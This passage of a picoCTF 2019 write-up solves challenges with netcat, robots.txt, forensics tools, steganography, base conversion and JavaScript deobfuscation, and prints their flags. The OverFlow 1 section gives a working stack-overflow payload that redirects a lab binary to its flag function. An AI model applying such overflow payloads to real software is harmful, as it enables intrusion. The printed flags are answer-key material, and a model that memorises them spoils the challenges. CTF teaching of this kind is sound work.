password<span style="color:#f92672">.</span><span style="color:#a6e22e">charAt</span><span style="color:#f92672">(</span>5<span style="color:#f92672">)</span>  <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;4&#39;</span>
password<span style="color:#f92672">.</span><span style="color:#a6e22e">charAt</span><span style="color:#f92672">(</span>9<span style="color:#f92672">)</span>  <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;3&#39;</span>
password<span style="color:#f92672">.</span><span style="color:#a6e22e">charAt</span><span style="color:#f92672">(</span>11<span style="color:#f92672">)</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;t&#39;</span>
password<span style="color:#f92672">.</span><span style="color:#a6e22e">charAt</span><span style="color:#f92672">(</span>15<span style="color:#f92672">)</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;c&#39;</span>
password<span style="color:#f92672">.</span><span style="color:#a6e22e">charAt</span><span style="color:#f92672">(</span>8<span style="color:#f92672">)</span>  <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;l&#39;</span>
password<span style="color:#f92672">.</span><span style="color:#a6e22e">charAt</span><span style="color:#f92672">(</span>12<span style="color:#f92672">)</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;H&#39;</span>
password<span style="color:#f92672">.</span><span style="color:#a6e22e">charAt</span><span style="color:#f92672">(</span>20<span style="color:#f92672">)</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;c&#39;</span>
password<span style="color:#f92672">.</span><span style="color:#a6e22e">charAt</span><span style="color:#f92672">(</span>14<span style="color:#f92672">)</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;_&#39;</span>
password<span style="color:#f92672">.</span><span style="color:#a6e22e">charAt</span><span style="color:#f92672">(</span>6<span style="color:#f92672">)</span>  <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;m&#39;</span>
password<span style="color:#f92672">.</span><span style="color:#a6e22e">charAt</span><span style="color:#f92672">(</span>24<span style="color:#f92672">)</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;5&#39;</span>
password<span style="color:#f92672">.</span><span style="color:#a6e22e">charAt</span><span style="color:#f92672">(</span>18<span style="color:#f92672">)</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;r&#39;</span>
password<span style="color:#f92672">.</span><span style="color:#a6e22e">charAt</span><span style="color:#f92672">(</span>13<span style="color:#f92672">)</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;3&#39;</span>
password<span style="color:#f92672">.</span><span style="color:#a6e22e">charAt</span><span style="color:#f92672">(</span>19<span style="color:#f92672">)</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;4&#39;</span>
password<span style="color:#f92672">.</span><span style="color:#a6e22e">charAt</span><span style="color:#f92672">(</span>21<span style="color:#f92672">)</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;T&#39;</span>
password<span style="color:#f92672">.</span><span style="color:#a6e22e">charAt</span><span style="color:#f92672">(</span>16<span style="color:#f92672">)</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;H&#39;</span>
password<span style="color:#f92672">.</span><span style="color:#a6e22e">charAt</span><span style="color:#f92672">(</span>27<span style="color:#f92672">)</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;3&#39;</span>
password<span style="color:#f92672">.</span><span style="color:#a6e22e">charAt</span><span style="color:#f92672">(</span>30<span style="color:#f92672">)</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;a&#39;</span>
password<span style="color:#f92672">.</span><span style="color:#a6e22e">charAt</span><span style="color:#f92672">(</span>25<span style="color:#f92672">)</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;_&#39;</span>
password<span style="color:#f92672">.</span><span style="color:#a6e22e">charAt</span><span style="color:#f92672">(</span>22<span style="color:#f92672">)</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;3&#39;</span>
password<span style="color:#f92672">.</span><span style="color:#a6e22e">charAt</span><span style="color:#f92672">(</span>28<span style="color:#f92672">)</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;b&#39;</span>
password<span style="color:#f92672">.</span><span style="color:#a6e22e">charAt</span><span style="color:#f92672">(</span>26<span style="color:#f92672">)</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;0&#39;</span>
password<span style="color:#f92672">.</span><span style="color:#a6e22e">charAt</span><span style="color:#f92672">(</span>31<span style="color:#f92672">)</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;0&#39;</span>
</code></pre></div><h2 id="whats-a-net-cat---general-skills">what&rsquo;s a net cat - General Skills</h2>
<pre><code class="language-console" data-lang="console">$ nc -v 2019shell1.picoctf.com 37851
Connection to 2019shell1.picoctf.com 37851 port [tcp/*] succeeded!
You're on your way to becoming the net cat master
picoCTF{nEtCat_Mast3ry_628e0244}
</code></pre><h2 id="where-are-the-robots---web-exploitation">where are the robots - Web Exploitation</h2>
<p>Go to the robots.txt
You&rsquo;ll find that there is a &lsquo;secret&rsquo; webpage: /8e32f.html
You&rsquo;ll find the flag there</p>
<p>The robots.txt is a &ldquo;sign&rdquo; to tell web crawlers and search engines like Google not to index or go to those webpages</p>
<h2 id="overflow-1---binary-exploitation">OverFlow 1 - Binary Exploitation</h2>
<p>Check what type of binary this is</p>
<pre><code class="language-console" data-lang="console">$ file vuln
vuln: setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 3.2.0, BuildID[sha1]=5d4cdc8dc51fb3e5d45c2a59c6a9cd7958382fc9, not stripped
</code></pre><p>The vulnerable part of the code is the  <code>gets(buf);</code> in the vuln() function:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">vuln</span>(){
  <span style="color:#66d9ef">char</span> buf[BUFFSIZE];
  gets(buf);

  printf(<span style="color:#e6db74">&#34;Woah, were jumping to 0x%x !</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, get_return_address());
}
</code></pre></div><p>The source code already has a flag() function helpfully placed in the program to read the flag out to us:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">flag</span>() {
  <span style="color:#66d9ef">char</span> buf[FLAGSIZE];
  FILE <span style="color:#f92672">*</span>f <span style="color:#f92672">=</span> fopen(<span style="color:#e6db74">&#34;flag.txt&#34;</span>,<span style="color:#e6db74">&#34;r&#34;</span>);
  <span style="color:#66d9ef">if</span> (f <span style="color:#f92672">==</span> NULL) {
    printf(<span style="color:#e6db74">&#34;Flag File is Missing. please contact an Admin if you are running this on the shell server.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
    exit(<span style="color:#ae81ff">0</span>);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}
</code></pre></div><p>We just have to overwrite the return address with the address of flag.</p>
<p>Get the address of flag</p>
<pre><code class="language-console" data-lang="console">$ objdump -d ./vuln | grep flag
080485e6 &lt;flag&gt;:
 8048618:       75 1c                   jne    8048636 &lt;flag+0x50&gt;
</code></pre><p>The address of the flag() function is 0x80485e6</p>
<p>Intel x86 uses little endian so use e6 85 04 08  when overwriting the ret address</p>
<pre><code class="language-console" data-lang="console">$ echo -e 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDD\xe6\x85\x04\x08' | ./vuln
Give me a string and lets see what happens:
Woah, were jumping to 0x80485e6 !
picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5fe1ff3d8}Segmentation fault (core dumped)
</code></pre><p>We use more than 64 bytes because there&rsquo;s some padding and other stuff we have to overwrite before we hit the return address (like the saved EBP). Experiment with different amounts of A&rsquo;s to see how many bytes are needed to reach the ret address.</p>
<h2 id="so-meta---forensics">So Meta - Forensics</h2>
<p>Grep to win</p>
<pre><code class="language-console" data-lang="console">$ strings  pico_img.png | grep pico
picoCTF{s0_m3ta_43f253bb}
</code></pre><p>or use exiftool to look at metadata</p>
<pre><code class="language-console" data-lang="console">$ exiftool pico_img.png | grep pico
File Name                       : pico_img.png
Artist                          : picoCTF{s0_m3ta_43f253bb}
</code></pre><h2 id="what-lies-within---forensics">What Lies Within - Forensics</h2>
<pre><code class="language-console" data-lang="console">$ strings buildings.png | grep pico # Always grep to win
$ file buildings.png
buildings.png: PNG image data, 657 x 438, 8-bit/color RGBA, non-interlaced
$ exiftool buildings.png # Check the metadata
ExifTool Version Number         : 10.80
File Name                       : buildings.png
Directory                       : .
File Size                       : 611 kB
File Modification Date/Time     : 2019:09:28 10:54:24-04:00
File Access Date/Time           : 2020:05:05 16:41:04-04:00
File Inode Change Date/Time     : 2020:05:05 16:41:04-04:00
File Permissions                : rw-rw-rw-
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 657
Image Height                    : 438
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Image Size                      : 657x438
Megapixels                      : 0.288
</code></pre><p>Gynvael tries editing the headers to see if there are any hidden rows, opening in GIMP to see if any of the channels have data, and tries adjusting the color curves.</p>
<p>LSB (Least Significant Bit) Steganography turns out to be the solution.</p>
<p>Data is hidden using the least significant bit. E.g. for a color 0x31708f, the f could be changed to a b to store data. The small change in color is not really noticeable.</p>
<p>Use an online <a href="https://stylesuxx.github.io/steganography/">decoder</a>. If you&rsquo;ve never implemented LSB steg, then that&rsquo;s another thing you should implement according to Gynvael.</p>
<h2 id="extensions---forensics">Extensions - Forensics</h2>
<pre><code class="language-console" data-lang="console">$ strings flag.txt | grep pico # Grep to win
$ file flag.txt
flag.txt: PNG image data, 1697 x 608, 8-bit/color RGB, non-interlaced
$ mv flag.txt flag.png # Change the extension to a png
</code></pre><p>Just change the extension and open the image</p>
<h2 id="shark-on-the-wire-1---forensics">shark on the wire 1 - Forensics</h2>
<p>Use wireshark</p>
<p>Gynvael does the following:</p>
<p>Filter packet bytes string pico
Notice that there are UDP packets with length 1 that seem to contain one character of the flag. Filter for UPD packets of length 1. Filter again with 10.0.0.2 since that is the IP address that seems to be associated with the flag data.</p>
<p>Gynvael then just uses &ldquo;Follow UDP stream&rdquo; to find the flag</p>
<h2 id="based---general-skills">Based - General Skills</h2>
<p>Just convert binary to ascii, decimal to ascii, and octal to ascii, etc.</p>
<pre><code class="language-pycon" data-lang="pycon">$ python
&gt;&gt;&gt; list = &quot;146 141 154 143 157 156&quot;
&gt;&gt;&gt; base = 8
&gt;&gt;&gt; ''.join([chr(int(x, base)) for x in list.split(&quot; &quot;)]) # Converts base to ascii
'falcon'
&gt;&gt;&gt; &quot;7461626c65&quot;.decode('hex') # Converts hex to ascii
'table'
</code></pre><p>Converting hex to ascii in python3</p>
<pre><code class="language-pycon" data-lang="pycon">$ python
&gt;&gt;&gt; bytes.fromhex(&quot;7461626c65&quot;)
b'table'
</code></pre><h2 id="client-side-again---web-exploitation">Client-side-again - Web Exploitation</h2>
<p>Look at the verify() function in the javascript</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">verify</span>() {
    <span style="color:#a6e22e">checkpass</span> <span style="color:#f92672">=</span> document[<span style="color:#a6e22e">_0x4b5b</span>(<span style="color:#e6db74">&#39;0x0&#39;</span>)](<span style="color:#e6db74">&#39;pass&#39;</span>)[<span style="color:#a6e22e">_0x4b5b</span>(<span style="color:#e6db74">&#39;0x1&#39;</span>)];
    <span style="color:#a6e22e">split</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4</span>;
    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">checkpass</span>[<span style="color:#a6e22e">_0x4b5b</span>(<span style="color:#e6db74">&#39;0x2&#39;</span>)](<span style="color:#ae81ff">0x0</span>, <span style="color:#a6e22e">split</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x2</span>) <span style="color:#f92672">==</span> <span style="color:#a6e22e">_0x4b5b</span>(<span style="color:#e6db74">&#39;0x3&#39;</span>)) {
        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">checkpass</span>[<span style="color:#a6e22e">_0x4b5b</span>(<span style="color:#e6db74">&#39;0x2&#39;</span>)](<span style="color:#ae81ff">0x7</span>, <span style="color:#ae81ff">0x9</span>) <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;{n&#39;</span>) {
            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">checkpass</span>[<span style="color:#a6e22e">_0x4b5b</span>(<span style="color:#e6db74">&#39;0x2&#39;</span>)](<span style="color:#a6e22e">split</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x2</span>, <span style="color:#a6e22e">split</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x2</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x2</span>) <span style="color:#f92672">==</span> <span style="color:#a6e22e">_0x4b5b</span>(<span style="color:#e6db74">&#39;0x4&#39;</span>)) {
                <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">checkpass</span>[<span style="color:#a6e22e">_0x4b5b</span>(<span style="color:#e6db74">&#39;0x2&#39;</span>)](<span style="color:#ae81ff">0x3</span>, <span style="color:#ae81ff">0x6</span>) <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;oCT&#39;</span>) {
                    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">checkpass</span>[<span style="color:#a6e22e">_0x4b5b</span>(<span style="color:#e6db74">&#39;0x2&#39;</span>)](<span style="color:#a6e22e">split</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x3</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x2</span>, <span style="color:#a6e22e">split</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x4</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x2</span>) <span style="color:#f92672">==</span> <span style="color:#a6e22e">_0x4b5b</span>(<span style="color:#e6db74">&#39;0x5&#39;</span>)) {
                        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">checkpass</span>[<span style="color:#e6db74">&#39;substring&#39;</span>](<span style="color:#ae81ff">0x6</span>, <span style="color:#ae81ff">0xb</span>) <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;F{not&#39;</span>) {
                            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">checkpass</span>[<span style="color:#a6e22e">_0x4b5b</span>(<span style="color:#e6db74">&#39;0x2&#39;</span>)](<span style="color:#a6e22e">split</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x2</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x2</span>, <span style="color:#a6e22e">split</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x3</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x2</span>) <span style="color:#f92672">==</span> <span style="color:#a6e22e">_0x4b5b</span>(<span style="color:#e6db74">&#39;0x6&#39;</span>)) {
                                <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">checkpass</span>[<span style="color:#a6e22e">_0x4b5b</span>(<span style="color:#e6db74">&#39;0x2&#39;</span>)](<span style="color:#ae81ff">0xc</span>, <span style="color:#ae81ff">0x10</span>) <span style="color:#f92672">==</span> <span style="color:#a6e22e">_0x4b5b</span>(<span style="color:#e6db74">&#39;0x7&#39;</span>)) {
                                    <span style="color:#a6e22e">alert</span>(<span style="color:#a6e22e">_0x4b5b</span>(<span style="color:#e6db74">&#39;0x8&#39;</span>));
                                }
                            }
                        }
                    }
                }
            }
        }
    } <span style="color:#66d9ef">else</span> {
        <span style="color:#a6e22e">alert</span>(<span style="color:#a6e22e">_0x4b5b</span>(<span style="color:#e6db74">&#39;0x9&#39;</span>));
    }
}
</code></pre></div><p>Isolate only the if cases</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">checkpass</span>[<span style="color:#a6e22e">_0x4b5b</span>(<span style="color:#e6db74">&#39;0x2&#39;</span>)](<span style="color:#ae81ff">0x0</span>, <span style="color:#a6e22e">split</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x2</span>) <span style="color:#f92672">==</span> <span style="color:#a6e22e">_0x4b5b</span>(<span style="color:#e6db74">&#39;0x3&#39;</span>))
<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">checkpass</span>[<span style="color:#a6e22e">_0x4b5b</span>(<span style="color:#e6db74">&#39;0x2&#39;</span>)](<span style="color:#ae81ff">0x7</span>, <span style="color:#ae81ff">0x9</span>) <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;{n&#39;</span>)
<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">checkpass</span>[<span style="color:#a6e22e">_0x4b5b</span>(<span style="color:#e6db74">&#39;0x2&#39;</span>)](<span style="color:#a6e22e">split</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x2</span>, <span style="color:#a6e22e">split</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x2</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x2</span>) <span style="color:#f92672">==</span> <span style="color:#a6e22e">_0x4b5b</span>(<span style="color:#e6db74">&#39;0x4&#39;</span>))
<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">checkpass</span>[<span style="color:#a6e22e">_0x4b5b</span>(<span style="color:#e6db74">&#39;0x2&#39;</span>)](<span style="color:#ae81ff">0x3</span>, <span style="color:#ae81ff">0x6</span>) <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;oCT&#39;</span>)
<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">checkpass</span>[<span style="color:#a6e22e">_0x4b5b</span>(<span style="color:#e6db74">&#39;0x2&#39;</span>)](<span style="color:#a6e22e">split</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x3</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x2</span>, <span style="color:#a6e22e">split</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x4</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x2</span>) <span style="color:#f92672">==</span> <span style="color:#a6e22e">_0x4b5b</span>(<span style="color:#e6db74">&#39;0x5&#39;</span>))
<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">checkpass</span>[<span style="color:#e6db74">&#39;substring&#39;</span>](<span style="color:#ae81ff">0x6</span>, <span style="color:#ae81ff">0xb</span>) <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;F{not&#39;</span>)
<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">checkpass</span>[<span style="color:#a6e22e">_0x4b5b</span>(<span style="color:#e6db74">&#39;0x2&#39;</span>)](<span style="color:#a6e22e">split</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x2</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x2</span>, <span style="color:#a6e22e">split</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x3</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x2</span>) <span style="color:#f92672">==</span> <span style="color:#a6e22e">_0x4b5b</span>(<span style="color:#e6db74">&#39;0x6&#39;</span>))
<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">checkpass</span>[<span style="color:#a6e22e">_0x4b5b</span>(<span style="color:#e6db74">&#39;0x2&#39;</span>)](<span style="color:#ae81ff">0xc</span>, <span style="color:#ae81ff">0x10</span>) <span style="color:#f92672">==</span> <span style="color:#a6e22e">_0x4b5b</span>(<span style="color:#e6db74">&#39;0x7&#39;</span>))
</code></pre></div><p>Replace split with 0x4 since we know split = 0x4</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">checkpass</span>[<span style="color:#a6e22e">_0x4b5b</span>(<span style="color:#e6db74">&#39;0x2&#39;</span>)](<span style="color:#ae81ff">0x0</span>, <span style="color:#ae81ff">0x4</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x2</span>) <span style="color:#f92672">==</span> <span style="color:#a6e22e">_0x4b5b</span>(<span style="color:#e6db74">&#39;0x3&#39;</span>))
<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">checkpass</span>[<span style="color:#a6e22e">_0x4b5b</span>(<span style="color:#e6db74">&#39;0x2&#39;</span>)](<span style="color:#ae81ff">0x7</span>, <span style="color:#ae81ff">0x9</span>) <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;{n&#39;</span>)
<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">checkpass</span>[<span style="color:#a6e22e">_0x4b5b</span>(<span style="color:#e6db74">&#39;0x2&#39;</span>)](<span style="color:#ae81ff">0x4</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x2</span>, <span style="color:#ae81ff">0x4</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x2</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x2</span>) <span style="color:#f92672">==</span> <span style="color:#a6e22e">_0x4b5b</span>(<span style="color:#e6db74">&#39;0x4&#39;</span>))
<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">checkpass</span>[<span style="color:#a6e22e">_0x4b5b</span>(<span style="color:#e6db74">&#39;0x2&#39;</span>)](<span style="color:#ae81ff">0x3</span>, <span style="color:#ae81ff">0x6</span>) <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;oCT&#39;</span>)
<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">checkpass</span>[<span style="color:#a6e22e">_0x4b5b</span>(<span style="color:#e6db74">&#39;0x2&#39;</span>)](<span style="color:#ae81ff">0x4</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x3</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x2</span>, <span style="color:#ae81ff">0x4</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x4</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x2</span>) <span style="color:#f92672">==</span> <span style="color:#a6e22e">_0x4b5b</span>(<span style="color:#e6db74">&#39;0x5&#39;</span>))
<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">checkpass</span>[<span style="color:#e6db74">&#39;substring&#39;</span>](<span style="color:#ae81ff">0x6</span>, <span style="color:#ae81ff">0xb</span>) <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;F{not&#39;</span>)
<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">checkpass</span>[<span style="color:#a6e22e">_0x4b5b</span>(<span style="color:#e6db74">&#39;0x2&#39;</span>)](<span style="color:#ae81ff">0x4</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x2</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x2</span>, <span style="color:#ae81ff">0x4</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x3</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x2</span>) <span style="color:#f92672">==</span> <span style="color:#a6e22e">_0x4b5b</span>(<span style="color:#e6db74">&#39;0x6&#39;</span>))
<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">checkpass</span>[<span style="color:#a6e22e">_0x4b5b</span>(<span style="color:#e6db74">&#39;0x2&#39;</span>)](<span style="color:#ae81ff">0xc</span>, <span style="color:#ae81ff">0x10</span>) <span style="color:#f92672">==</span> <span style="color:#a6e22e">_0x4b5b</span>(<span style="color:#e6db74">&#39;0x7&#39;</span>))
</code></pre></div><p>Do math and simplify</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">checkpass</span>[<span style="color:#a6e22e">_0x4b5b</span>(<span style="color:#e6db74">&#39;0x2&#39;</span>)](<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">8</span>) <span style="color:#f92672">==</span> <span style="color:#a6e22e">_0x4b5b</span>(<span style="color:#e6db74">&#39;0x3&#39;</span>))
<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">checkpass</span>[<span style="color:#a6e22e">_0x4b5b</span>(<span style="color:#e6db74">&#39;0x2&#39;</span>)](<span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">9</span>) <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;{n&#39;</span>)
<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">checkpass</span>[<span style="color:#a6e22e">_0x4b5b</span>(<span style="color:#e6db74">&#39;0x2&#39;</span>)](<span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">16</span>) <span style="color:#f92672">==</span> <span style="color:#a6e22e">_0x4b5b</span>(<span style="color:#e6db74">&#39;0x4&#39;</span>))
<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">checkpass</span>[<span style="color:#a6e22e">_0x4b5b</span>(<span style="color:#e6db74">&#39;0x2&#39;</span>)](<span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">6</span>) <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;oCT&#39;</span>)
<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">checkpass</span>[<span style="color:#a6e22e">_0x4b5b</span>(<span style="color:#e6db74">&#39;0x2&#39;</span>)](<span style="color:#ae81ff">24</span>, <span style="color:#ae81ff">32</span>) <span style="color:#f92672">==</span> <span style="color:#a6e22e">_0x4b5b</span>(<span style="color:#e6db74">&#39;0x5&#39;</span>))
<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">checkpass</span>[<span style="color:#e6db74">&#39;substring&#39;</span>](<span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">11</span>) <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;F{not&#39;</span>)
<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">checkpass</span>[<span style="color:#a6e22e">_0x4b5b</span>(<span style="color:#e6db74">&#39;0x2&#39;</span>)](<span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">24</span>) <span style="color:#f92672">==</span> <span style="color:#a6e22e">_0x4b5b</span>(<span style="color:#e6db74">&#39;0x6&#39;</span>))
<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">checkpass</span>[<span style="color:#a6e22e">_0x4b5b</span>(<span style="color:#e6db74">&#39;0x2&#39;</span>)](<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">16</span>) <span style="color:#f92672">==</span> <span style="color:#a6e22e">_0x4b5b</span>(<span style="color:#e6db74">&#39;0x7&#39;</span>))
</code></pre></div><p>We can use the javascript console to figure out that _0x4b5b(&lsquo;0x2&rsquo;) is just substring so all the checkpass[_0x4b5b(&lsquo;0x2&rsquo;)] can be replaced with checkpass[&lsquo;substring&rsquo;]</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">checkpass</span>[<span style="color:#e6db74">&#39;substring&#39;</span>](<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">8</span>) <span style="color:#f92672">==</span> <span style="color:#a6e22e">_0x4b5b</span>(<span style="color:#e6db74">&#39;0x3&#39;</span>))
<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">checkpass</span>[<span style="color:#e6db74">&#39;substring&#39;</span>](<span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">9</span>) <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;{n&#39;</span>)
<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">checkpass</span>[<span style="color:#e6db74">&#39;substring&#39;</span>](<span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">16</span>) <span style="color:#f92672">==</span> <span style="color:#a6e22e">_0x4b5b</span>(<span style="color:#e6db74">&#39;0x4&#39;</span>))
<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">checkpass</span>[<span style="color:#e6db74">&#39;substring&#39;</span>](<span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">6</span>) <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;oCT&#39;</span>)
<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">checkpass</span>[<span style="color:#e6db74">&#39;substring&#39;</span>](<span style="color:#ae81ff">24</span>, <span style="color:#ae81ff">32</span>) <span style="color:#f92672">==</span> <span style="color:#a6e22e">_0x4b5b</span>(<span style="color:#e6db74">&#39;0x5&#39;</span>))
<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">checkpass</span>[<span style="color:#e6db74">&#39;substring&#39;</span>](<span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">11</span>) <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;F{not&#39;</span>)
<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">checkpass</span>[<span style="color:#e6db74">&#39;substring&#39;</span>](<span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">24</span>) <span style="color:#f92672">==</span> <span style="color:#a6e22e">_0x4b5b</span>(<span style="color:#e6db74">&#39;0x6&#39;</span>))
